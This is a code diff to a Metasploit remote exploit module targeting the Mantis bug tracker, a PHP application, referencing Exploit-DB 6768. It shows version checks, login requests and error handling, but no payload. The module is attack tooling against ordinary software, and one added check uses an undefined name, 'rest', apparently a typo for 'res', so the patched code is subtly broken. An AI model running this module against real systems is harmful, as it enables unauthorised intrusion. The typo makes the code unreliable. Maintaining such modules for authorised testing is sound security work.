@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'References'     =>
         [
           ['EDB', '6768'],
-	  ['URL', 'https://www.exploit-db.com/exploits/6768/'],
+          ['URL', 'https://www.exploit-db.com/exploits/6768/'],
         ],
        'Privileged' => false,
        'Platform'   => ['php'],
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     print_status("Mantis version #{major}.#{minor}.#{rev} detected")
 
-    unless res.code == 200 && (major.to_i > 1 || minor.to_i > 1 || (minor.to_i == 1 && rev.to_i > 3))
+    unless rest && res.code == 200 && (major.to_i > 1 || minor.to_i > 1 || (minor.to_i == 1 && rev.to_i > 3))
       return CheckCode::Appears
     end
 
@@ -77,7 +77,10 @@ class MetasploitModule < Msf::Exploit::Remote
     res = send_request_cgi({
         'method'   => 'GET',
         'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
-    })    
+    })
+    unless res
+      fail_with(Failure::NoAccess, 'Cannot access host to log in!')
+    end
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'login.php'),
       'method'    => 'POST',
@@ -115,9 +118,6 @@ class MetasploitModule < Msf::Exploit::Remote
       },
       'encode_params' => false,
     })
-    unless res.nil?
-      fail_with(Failure::NoAccess, 'Host disconnected during exploit!')
-   end
+    fail_with(Failure::NoAccess, 'Host disconnected during exploit!') unless res
   end
 end
-
